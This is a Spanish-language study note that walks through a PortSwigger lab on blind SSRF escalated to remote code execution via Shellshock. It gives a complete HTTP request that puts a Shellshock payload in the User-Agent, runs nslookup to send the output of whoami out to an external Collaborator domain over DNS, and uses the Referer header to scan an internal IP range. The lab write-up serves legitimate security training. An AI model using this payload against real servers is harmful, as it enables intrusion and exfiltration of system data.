---
aliases:
  - SSRF 007 - ciego RCE Shellshock
  - blind ssrf shellshock
tags:
  - vuln/ssrf
  - example
  - portswigger
---

# 007 — SSRF ciego → RCE (Shellshock)

> Lab: [Blind SSRF with Shellshock exploitation](https://portswigger.net/web-security/ssrf/blind/lab-shellshock-exploitation) · **Expert** · técnica → [[vulnerabilities/007-ssrf/ssrf|entry point]]

## ¿Por qué acá? (el más rebuscado: combina todo)
- **Vengo de [[vulnerabilities/007-ssrf/examples/006-ssrf-ciego-deteccion-oob|006]]:** confirmé que hay SSRF ciego por el `Referer`, pero eso **solo prueba que existe** — no me da nada.
- **Por qué no me alcanza 006:** quiero **impacto real** sin ver la respuesta. Necesito un **servicio interno vulnerable** al que pegarle, y sacar el resultado por un canal que no dependa de la respuesta HTTP.
- **Entonces:** combino tres cosas que ya vi por separado:
  - **escaneo de red interna** (como [[vulnerabilities/007-ssrf/examples/002-ssrf-escaneo-red-interna|002]]) — pero por el `Referer`,
  - **canal OOB** (como [[vulnerabilities/007-ssrf/examples/006-ssrf-ciego-deteccion-oob|006]]) — DNS al Collaborator,
  - y un **payload Shellshock** que ejecuta un comando en el server interno vulnerable.

## Cómo explotarlo
El server interno corre CGI vulnerable a **Shellshock**. Metés el payload en el **`User-Agent`** y escaneás el rango interno por el **`Referer`** con **Intruder** (sniper sobre el octeto):
```http
GET /product?productId=1 HTTP/1.1
Host: LAB.web-security-academy.net
User-Agent: () { :; }; /usr/bin/nslookup $(whoami).TU-SUBDOMINIO.oastify.com
Referer: http://192.168.0.§1§:8080
```
Cuando el `Referer` pega en la IP correcta, el CGI ejecuta el `User-Agent` → `nslookup` filtra `$(whoami)` como **subdominio DNS**.

## Verificación
En **Collaborator → Poll now** aparece una consulta DNS tipo `<usuario-del-SO>.TU-SUBDOMINIO.oastify.com`. Ese `<usuario-del-SO>` es la solución.

## Detalles que se pasan por alto
- **`() { :; };`** es la firma de Shellshock: define una función vacía y lo que sigue se ejecuta al parsear la variable de entorno (el CGI mete el `User-Agent` en el entorno).
- **Exfil por DNS**, no por HTTP: el resultado del comando viaja **en el nombre de subdominio** (porque es ciego, igual que 006).
- Es **Expert** porque **junta lo de 002 + 006** y encima escala a **RCE**: es el techo de la escalera de SSRF.
